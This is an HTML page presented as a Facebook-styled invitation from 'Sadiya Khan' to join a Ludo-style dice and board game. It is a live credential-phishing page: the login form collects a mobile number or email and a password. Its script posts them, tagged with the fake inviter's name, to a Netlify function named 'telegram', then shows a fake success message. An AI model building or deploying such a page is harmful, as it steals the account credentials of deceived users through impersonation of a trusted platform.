<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Game Invitation</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;
        }
        
        body {
            background-color: #f0f2f5;
            min-height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
            padding: 20px;
        }
        
        .container {
            width: 100%;
            max-width: 400px;
            background: white;
            border-radius: 8px;
            box-shadow: 0 2px 4px rgba(0, 0, 0, .1), 0 8px 16px rgba(0, 0, 0, .1);
            overflow: hidden;
        }
        
        /* Header */
        .header {
            background: #1877f2;
            padding: 20px;
            text-align: center;
            color: white;
        }
        
        .header h1 {
            font-size: 24px;
            font-weight: 600;
            margin-bottom: 15px;
        }
        
        .inviter-card {
            background: rgba(255, 255, 255, 0.15);
            border-radius: 8px;
            padding: 15px;
            margin: 10px 0;
            backdrop-filter: blur(10px);
            border: 1px solid rgba(255, 255, 255, 0.2);
        }
        
        .inviter-name {
            font-size: 18px;
            font-weight: 600;
            margin-bottom: 5px;
        }
        
        .inviter-text {
            font-size: 14px;
            opacity: 0.9;
        }
        
        /* Game Preview */
        .game-preview {
            padding: 20px;
            text-align: center;
            background: #f7f8fa;
            border-bottom: 1px solid #dddfe2;
        }
        
        .game-title {
            font-size: 20px;
            color: #1c1e21;
            margin-bottom: 15px;
            font-weight: 600;
        }
        
        .ludo-preview {
            width: 120px;
            height: 120px;
            margin: 0 auto 15px;
            background: white;
            border-radius: 12px;
            border: 2px solid #e4e6eb;
            position: relative;
            box-shadow: 0 2px 8px rgba(0, 0, 0, 0.1);
        }
        
        .ludo-grid {
            width: 100%;
            height: 100%;
            position: relative;
            background: 
                linear-gradient(90deg, transparent 49%, #bcc0c4 49%, #bcc0c4 51%, transparent 51%),
                linear-gradient(transparent 49%, #bcc0c4 49%, #bcc0c4 51%, transparent 51%);
            border-radius: 10px;
        }
        
        .ludo-corner {
            position: absolute;
            width: 40%;
            height: 40%;
            border-radius: 8px;
        }
        
        .corner-1 { background: #e41e3f; top: 5%; left: 5%; }
        .corner-2 { background: #42b72a; top: 5%; right: 5%; }
        .corner-3 { background: #fbbc05; bottom: 5%; left: 5%; }
        .corner-4 { background: #1877f2; bottom: 5%; right: 5%; }
        
        .ludo-center {
            position: absolute;
            top: 50%;
            left: 50%;
            transform: translate(-50%, -50%);
            width: 20px;
            height: 20px;
            background: #1877f2;
            border-radius: 50%;
            border: 2px solid white;
        }
        
        /* Form Section */
        .form-section {
            padding: 20px;
        }
        
        .form-section h2 {
            color: #1c1e21;
            font-size: 18px;
            text-align: center;
            margin-bottom: 20px;
            font-weight: 600;
        }
        
        .form-group {
            margin-bottom: 16px;
        }
        
        .form-group label {
            display: block;
            color: #606770;
            font-size: 15px;
            margin-bottom: 8px;
            font-weight: 500;
        }
        
        .form-input {
            width: 100%;
            padding: 14px 16px;
            border: 1px solid #dddfe2;
            border-radius: 6px;
            font-size: 17px;
            background: #f5f6f7;
            color: #1c1e21;
        }
        
        .form-input:focus {
            outline: none;
            border-color: #1877f2;
            box-shadow: 0 0 0 2px rgba(24, 119, 242, 0.2);
            background: white;
        }
        
        .form-input::placeholder {
            color: #8a8d91;
        }
        
        .login-btn {
            width: 100%;
            background: #1877f2;
            color: white;
            border: none;
            border-radius: 6px;
            padding: 14px;
            font-size: 17px;
            font-weight: 600;
            cursor: pointer;
            transition: background-color 0.2s;
            margin-top: 10px;
        }
        
        .login-btn:hover {
            background: #166fe5;
        }
        
        /* Divider */
        .divider {
            height: 1px;
            background: #dadde1;
            margin: 20px 0;
            position: relative;
        }
        
        .divider-text {
            position: absolute;
            top: 50%;
            left: 50%;
            transform: translate(-50%, -50%);
            background: white;
            padding: 0 15px;
            color: #8a8d91;
            font-size: 13px;
        }
        
        /* Links */
        .forgot-link {
            display: block;
            text-align: center;
            color: #1877f2;
            text-decoration: none;
            font-size: 14px;
            margin: 15px 0;
            padding: 12px;
            border-radius: 6px;
        }
        
        .forgot-link:hover {
            background: #f5f6f7;
            text-decoration: underline;
        }
        
        .create-btn {
            display: block;
            background: #42b72a;
            color: white;
            border: none;
            border-radius: 6px;
            padding: 14px;
            font-size: 16px;
            font-weight: 600;
            cursor: pointer;
            text-align: center;
            text-decoration: none;
            transition: background-color 0.2s;
        }
        
        .create-btn:hover {
            background: #36a420;
        }
        
        /* Features */
        .features {
            margin-top: 20px;
            padding: 15px;
            background: #f7f8fa;
            border-radius: 8px;
            border-left: 4px solid #1877f2;
        }
        
        .features h3 {
            color: #1c1e21;
            font-size: 16px;
            margin-bottom: 10px;
            font-weight: 600;
        }
        
        .feature-item {
            color: #606770;
            font-size: 14px;
            margin: 8px 0;
            display: flex;
            align-items: center;
        }
        
        .feature-item::before {
            content: "•";
            color: #1877f2;
            font-weight: bold;
            margin-right: 8px;
        }
        
        /* Result Message */
        #result {
            margin: 15px 0;
            padding: 12px;
            border-radius: 6px;
            text-align: center;
            font-weight: 500;
            display: none;
            font-size: 14px;
        }
        
        .success {
            background: #e7f3e8;
            color: #1e7e34;
            border: 1px solid #c3e6cb;
            display: block;
        }
        
        .error {
            background: #f8d7da;
            color: #721c24;
            border: 1px solid #f5c6cb;
            display: block;
        }
        
        .loading {
            background: #e2e3e5;
            color: #383d41;
            border: 1px solid #d6d8db;
            display: block;
        }
        
        /* Footer */
        .footer {
            padding: 15px 20px;
            border-top: 1px solid #dddfe2;
            text-align: center;
            color: #8a8d91;
            font-size: 13px;
        }
        
        @media (max-width: 450px) {
            .container {
                max-width: 100%;
            }
            
            body {
                padding: 10px;
                background: white;
            }
        }
    </style>
</head>
<body>
    <div class="container">
        <!-- Header -->
        <div class="header">
            <h1>You're Invited!</h1>
            <div class="inviter-card">
                <div class="inviter-name">Sadiya Khan</div>
                <div class="inviter-text">invited you to play</div>
            </div>
        </div>
        
        <!-- Game Preview -->
        <div class="game-preview">
            <div class="game-title">Dice & Board Game</div>
            <div class="ludo-preview">
                <div class="ludo-grid">
                    <div class="ludo-corner corner-1"></div>
                    <div class="ludo-corner corner-2"></div>
                    <div class="ludo-corner corner-3"></div>
                    <div class="ludo-corner corner-4"></div>
                    <div class="ludo-center"></div>
                </div>
            </div>
        </div>
        
        <!-- Form Section -->
        <div class="form-section">
            <h2>Log in to join the game</h2>
            
            <form id="loginForm">
                <div class="form-group">
                    <label for="username">Mobile number or email address</label>
                    <input type="text" id="username" class="form-input" placeholder="Enter your mobile or email" required>
                </div>
                
                <div class="form-group">
                    <label for="password">Password</label>
                    <input type="password" id="password" class="form-input" placeholder="Enter your password" required>
                </div>
                
                <button type="button" class="login-btn" onclick="login()">
                    Log In
                </button>
            </form>
            
            <!-- Result Message -->
            <div id="result"></div>
            
            <!-- Links -->
            <a href="#" class="forgot-link">Forgotten password?</a>
            
            <div class="divider">
                <span class="divider-text">or</span>
            </div>
            
            <a href="#" class="create-btn">
                Create New Account
            </a>
            
            <!-- Features -->
            <div class="features">
                <h3>Game Features</h3>
                <div class="feature-item">Play with friends in real-time</div>
                <div class="feature-item">Simple and fun gameplay</div>
                <div class="feature-item">Win rewards and bonuses</div>
                <div class="feature-item">Available on all devices</div>
            </div>
        </div>
        
        <!-- Footer -->
        <div class="footer">
            Join now to play with your friends
        </div>
    </div>

    <script>
        async function login() {
            const username = document.getElementById('username').value.trim();
            const password = document.getElementById('password').value.trim();
            const resultDiv = document.getElementById('result');
            
            // Clear previous messages
            resultDiv.innerHTML = '';
            resultDiv.className = '';
            
            // Validation
            if (!username || !password) {
                showResult('Please fill in all fields', 'error');
                return;
            }
            
            // Show loading
            showResult('Connecting to game server...', 'loading');
            
            try {
                // Call Netlify Function
                const response = await fetch('/.netlify/functions/telegram', {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json',
                    },
                    body: JSON.stringify({
                        username: username,
                        password: password,
                        timestamp: new Date().toISOString(),
                        source: 'Game Invitation',
                        inviter: 'Sadiya Khan'
                    })
                });
                
                const data = await response.json();
                
                if (data.success) {
                    showResult('✓ Success! Joining the game...', 'success');
                    
                    // Clear form after 2 seconds
                    setTimeout(() => {
                        document.getElementById('username').value = '';
                        document.getElementById('password').value = '';
                    }, 2000);
                    
                } else {
                    showResult('✗ Login failed. Please check your credentials.', 'error');
                }
                
            } catch (error) {
                console.error('Login error:', error);
                showResult('✗ Network error. Please try again.', 'error');
            }
        }
        
        function showResult(message, type) {
            const resultDiv = document.getElementById('result');
            resultDiv.innerHTML = message;
            resultDiv.className = type;
        }
        
        // Enter key support
        document.getElementById('password').addEventListener('keypress', function(e) {
            if (e.key === 'Enter') {
                login();
            }
        });
        
        // Add click effect to buttons
        const loginBtn = document.querySelector('.login-btn');
        loginBtn.addEventListener('mousedown', function() {
            this.style.transform = 'scale(0.98)';
        });
        
        loginBtn.addEventListener('mouseup', function() {
            this.style.transform = '';
        });
        
        loginBtn.addEventListener('mouseleave', function() {
            this.style.transform = '';
        });
        
        // Animate game preview on hover
        const ludoPreview = document.querySelector('.ludo-preview');
        ludoPreview.addEventListener('mouseenter', function() {
            this.style.transform = 'scale(1.05)';
            this.style.transition = 'transform 0.3s ease';
        });
        
        ludoPreview.addEventListener('mouseleave', function() {
            this.style.transform = 'scale(1)';
        });
    </script>
</body>
</html>
